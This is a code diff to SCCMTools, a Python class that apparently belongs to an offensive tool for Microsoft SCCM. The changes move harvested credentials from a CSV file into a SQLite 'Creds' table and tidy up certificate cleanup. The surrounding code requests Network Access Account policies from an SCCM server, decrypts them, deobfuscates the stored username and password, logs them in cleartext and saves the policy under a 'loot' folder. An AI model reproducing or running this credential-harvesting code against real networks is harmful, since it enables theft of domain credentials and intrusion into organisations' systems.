@@ -25,6 +25,7 @@ from cryptography.x509 import ObjectIdentifier
 from requests_toolbelt.multipart import decoder
 from requests_ntlm import HttpNtlmAuth
 import xml.etree.ElementTree as ET
+import sqlite3
 import csv
 
 
@@ -280,7 +281,7 @@ class SCCMTools():
         policy = decrypted.decode('utf-16')
         return policy
     
-    def cleanupCertifcate(self, remove):
+    def cleanupCertificate(self, remove):
        if remove:
           os.remove("certificate.pem")
           os.remove("key.pem")
@@ -334,7 +335,6 @@ class SCCMTools():
     def parse_xml(self, xml_file):
         try:
             #might need to update this if the weird extra character isn't consistent from the file write
-            cred_dict = []
             if xml_file.endswith("Ȃ"):
                 xml_file = xml_file[:-len("Ȃ")]
                 i = ET.fromstring(xml_file)
@@ -343,15 +343,29 @@ class SCCMTools():
                     network_access_password = instance.find(".//property[@name='NetworkAccessPassword']/value").text
                     clear_user = self.deobfuscate_policysecret(network_access_username).decode('utf-16-le')
                     clear_pass = self.deobfuscate_policysecret(network_access_password).decode('utf-16-le')
-                    creds = {"username":clear_user, "password": clear_pass}
-                    cred_dict.append(creds)
                     logger.info("[+] Got NAA credential: " + clear_user + ":" + clear_pass)
-            Tools.write_to_csv(cred_dict, self.logs_dir)
+                    self.write_to_db(clear_user, clear_pass)
+            #Tools.write_to_csv(cred_dict, self.logs_dir)
 
         except ET.ParseError as e:
             print(f"An error occurred while parsing the XML: {e}")
         except Exception as e:
             print(e)
+        # cursor.execute(f'''insert into SiteServers (Hostname, SiteCode, SigningStatus, SiteServer, Active, Passive, MSSQL) values (?,?,?,?,?,?,?)''',
+        #                 (result, '', '', 'True', '', '', '')) 
+
+    def write_to_db(self, username, password):
+        source = "HTTP NAA"
+        database = f"{self.logs_dir}/db/find.db"
+        conn = sqlite3.connect(database, check_same_thread=False)
+        cursor = conn.cursor()
+        check = "select * from Creds where Username = ?"
+        cursor.execute(check, (username,))
+        exists = cursor.fetchone()
+        if not exists:
+            cursor.execute(f'''insert into Creds (Username, Password, Source) values (?,?,?)''', (username, password, source))
+            conn.commit()
+        return
     
     
     def sccmwtf_run(self):
@@ -366,8 +380,8 @@ class SCCMTools():
         logger.debug(f"[*] Done.. our ID is {uuid}")
 
         # If too quick, SCCM requests fail (DB error, jank!)
-        logger.info(f"[*] Waiting 10 seconds for database to update.")
-        time.sleep(10)
+        logger.info(f"[*] Waiting 20 seconds for database to update.")
+        time.sleep(20)
 
         logger.debug("[*] Requesting NAAPolicy.. 2 secs")
         urls = self.sendPolicyRequest(self._target_name, self._target_fqdn, uuid, self._target_name, self._target_fqdn, uuid)
@@ -376,7 +390,6 @@ class SCCMTools():
 
         policies = []
         for url in urls:
-
             result = self.requestPolicy(url)
             if result.startswith("<HTML>"):
                 try:
@@ -387,10 +400,15 @@ class SCCMTools():
                     Tools.write_to_file(decryptedResult, file_name)
                     policies.append(file_name)
                     logger.info(f"[+] Done.. decrypted policy dumped to {self.logs_dir}/loot/{self._server.split('.')[0]}_naapolicy.xml")
+                    self.cleanupCertificate(True)
+                    return True
                 except:
-                   logger.info(f"[-] Something went wrong.")
+                    logger.info(f"[-] Something went wrong.")
+        self.cleanupCertificate(True)
+        return False
+                
         
-        self.cleanupCertifcate(True)
+ 
 
 
 
